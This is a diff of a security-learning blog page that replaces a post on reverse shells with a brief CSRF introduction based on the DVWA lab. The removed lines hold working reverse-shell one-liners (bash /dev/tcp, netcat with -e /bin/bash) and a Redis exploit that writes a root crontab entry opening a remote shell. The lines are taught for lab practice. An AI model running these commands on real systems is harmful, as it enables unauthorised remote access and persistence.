@@ -6,20 +6,23 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>反弹shell | Yaoa</title>
+  <title>csrf | Yaoa</title>
   <meta name="author" content="yaoa">
   
-  <meta name="description" content="shell重定向
-文件描述符
+  <meta name="description" content="简介
+csrf(跨站请求伪造),简单说就是攻击者通过盗用身份认证信息，发送恶意请求。 CRSF能做的事情包括利用你的身份发邮件、发短信、进行交易转账等，甚至盗取你的账号。
 
-  0 标准输入
-  1 标准输出
-  2 标准错误输出"> 
+原理
+受害者登录网站A，在本地生成cookie。
+在不退出登录的情况下，访问恶意网站B。
+B要求访问网站A，发出一个request请求
+
+复现这里通过dvwa靶场还原csrf漏洞。"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="反弹shell"/>
+  <meta property="og:title" content="csrf"/>
   <meta property="og:site_name" content="Yaoa"/>
 
   
@@ -105,7 +108,7 @@
 
 	
 		<div class="page-header">
-			<h1> 反弹shell</h1>
+			<h1> csrf</h1>
 		</div>
 	
 
@@ -122,58 +125,16 @@
 	<div class="mypage">		
 	  		
 
-	  <h1 id="shell重定向"><a href="#shell重定向" class="headerlink" title="shell重定向"></a>shell重定向</h1><ul>
-<li>文件描述符</li>
-</ul>
-<pre><code>  0 标准输入
-  1 标准输出
-  2 标准错误输出</code></pre>
-<a id="more"></a>
-
-<ul>
-<li><p>输出重定向</p>
-<pre><code>&gt;  默认为标准输出重定向，与 1&gt; 相同
-2&gt;&amp;1  意思是把 标准错误输出 重定向到 标准输出.
-&amp;&gt;file  意思是把标准输出 和 标准错误输出 都重定向到文件file中</code></pre>
-</li>
-</ul>
-<ul>
-<li>忽略输出</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
-<ul>
-<li>输入重定向</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command &lt;file	将 file 文件中的内容作为 command 的输入。</span><br><span class="line">command &lt;&lt;END	从标准输入（键盘）中读取数据，直到遇见分界符 END 才停止（分界符可以是任意的字符串，用户自己定义）。</span><br><span class="line">command &lt;file1 &gt;file2	将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。</span><br></pre></td></tr></table></figure>
-<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><ul>
-<li><p>1.靶机监听 将bash发布出去，攻击机直连</p>
-<pre><code>靶机：nc -lvvp 8080 -t -e /bin/bash
-攻击机：nc 192.168.31.41 8080</code></pre>
-</li>
-<li><p>2.bash直接反弹</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.31.41/8080 0&gt;&amp;1</code></pre>
-<blockquote>
-<p>bash -i &gt;&amp; 中的&amp;表示在后台中运行</p>
+	  <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote>
+<p>csrf(跨站请求伪造),简单说就是攻击者通过盗用身份认证信息，发送恶意请求。 CRSF能做的事情包括利用你的身份发邮件、发短信、进行交易转账等，甚至盗取你的账号。</p>
 </blockquote>
-</li>
-<li><p>3.netcat工具反弹</p>
-<pre><code>攻击机：nc -lvvp 8080
-靶机：nc 192.168.31.174 8080 -t -e /bin/bash</code></pre>
-</li>
-<li><p>crontab反弹shell</p>
-<blockquote>
-<p>利用位置</p>
-<ul>
-<li>/etc/crontab linux通用</li>
-<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
-<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
-<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
-</ul>
-</blockquote>
-<p>exp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.227.128&#x2F;2333 0&gt;&amp;1\n\n\n\n&quot; </span><br><span class="line">config set dir &#x2F;etc&#x2F; </span><br><span class="line">config set dbfilename crontab </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ol>
+<li>受害者登录网站A，在本地生成cookie。</li>
+<li>在不退出登录的情况下，访问恶意网站B。</li>
+<li>B要求访问网站A，发出一个request请求</li>
+</ol>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>这里通过dvwa靶场还原csrf漏洞。</p>
+<p><img src="/images/csrf/image-20210104221744496.png" alt="image-20210104221744496"></p>
 
 	  <div class="article-footer-copyright">
 
@@ -183,7 +144,7 @@
 	</div>
 
 	
-	<span id="/2021/01/03/%E5%8F%8D%E5%BC%B9shell/" class="leancloud-visitors view" data-flag-title="反弹shell">
+	<span id="/2021/01/04/csrf/" class="leancloud-visitors view" data-flag-title="csrf">
 		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
 	</span>
 	
@@ -194,13 +155,12 @@
 
     
     
-    <a href="/2021/01/03/mongodb/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2021/01/03/crontab/" type="button" class="btn btn-default ">下一页<i
+    <a href="/2021/01/03/信息搜集/" type="button" class="btn btn-default ">下一页<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -217,8 +177,8 @@
     <h2 class="title">留言</h2>
 
     
-    <div class="ds-thread" data-thread-key="2021/01/03/反弹shell/" data-title="反弹shell"
-         data-url="http://yaoa.cool/2021/01/03/%E5%8F%8D%E5%BC%B9shell/"></div>
+    <div class="ds-thread" data-thread-key="2021/01/04/csrf/" data-title="csrf"
+         data-url="http://yaoa.cool/2021/01/04/csrf/"></div>
     
 </section>
 
@@ -235,7 +195,7 @@
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2021-01-03 
+	2021-01-04 
 	</div>
 	
 
@@ -246,7 +206,7 @@
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/渗透/">渗透<span>2</span></a></li>
+    <li><a href="/categories/web/">web<span>4</span></a></li>
   </li>
 
     </ul>
@@ -259,7 +219,7 @@
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/linux/">linux<span>5</span></a></li> <li><a href="/tags/web/">web<span>5</span></a></li> <li><a href="/tags/渗透/">渗透<span>5</span></a></li>
+  <li><a href="/tags/web/">web<span>5</span></a></li> <li><a href="/tags/靶场/">靶场<span>1</span></a></li>
     </ul>
 	</div>
 		
@@ -270,7 +230,7 @@
 	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
 	   <div id="toc" class="toc collapse in">
 		   <span class="toc-title">Contents</span>
-			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#shell%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-article-text">shell重定向</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-article-text">反弹shell</span></a></li></ol>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-article-text">简介</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-article-text">原理</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">复现</span></a></li></ol>
 		</div>
 	
 	</div>
